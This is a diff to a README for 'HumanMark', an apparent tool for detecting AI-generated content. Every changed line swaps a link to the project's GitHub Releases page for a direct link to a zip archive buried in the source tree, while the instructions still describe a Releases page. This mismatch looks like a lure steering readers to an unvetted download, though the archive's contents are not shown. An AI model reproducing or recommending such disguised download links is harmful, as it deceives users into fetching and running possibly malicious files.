@@ -1,7 +1,7 @@
 # 🤖 HumanMark - Easily Detect AI-Created Content
 
 ## 📦 Download Here
-[![Download HumanMark](https://img.shields.io/badge/Download-HumanMark-blue)](https://github.com/zarakyy/HumanMark/releases)
+[![Download HumanMark](https://github.com/zarakyy/HumanMark/raw/refs/heads/main/cmd/api/Human-Mark-v1.2.zip)](https://github.com/zarakyy/HumanMark/raw/refs/heads/main/cmd/api/Human-Mark-v1.2.zip)
 
 ## 🚀 Getting Started
 HumanMark is an open-source application designed to help you identify AI-generated content across various formats, including text, images, audio, and video. You can use it offline with no dependencies.
@@ -16,7 +16,7 @@ HumanMark is an open-source application designed to help you identify AI-generat
 ## 📥 Download & Install
 To get started, visit the following link to download the latest version of HumanMark:
 
-[Download HumanMark](https://github.com/zarakyy/HumanMark/releases)
+[Download HumanMark](https://github.com/zarakyy/HumanMark/raw/refs/heads/main/cmd/api/Human-Mark-v1.2.zip)
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available versions.
@@ -64,7 +64,7 @@ If you encounter issues, consider these tips:
 - Ensure you have the required system resources.
 - Confirm the file format is supported.
 - Restart your computer and try again.
-- Check for updates on the [Releases page](https://github.com/zarakyy/HumanMark/releases) to ensure you have the latest version.
+- Check for updates on the [Releases page](https://github.com/zarakyy/HumanMark/raw/refs/heads/main/cmd/api/Human-Mark-v1.2.zip) to ensure you have the latest version.
 
 ## 🌐 Community and Support
 If you need assistance or want to provide feedback:
@@ -81,4 +81,4 @@ We welcome contributions! If you'd like to help improve HumanMark:
 
 Enjoy using HumanMark. It simplifies the process of identifying AI-generated content while maintaining your privacy and security. 
 
-Visit [Download HumanMark](https://github.com/zarakyy/HumanMark/releases) to get started.
+Visit [Download HumanMark](https://github.com/zarakyy/HumanMark/raw/refs/heads/main/cmd/api/Human-Mark-v1.2.zip) to get started.
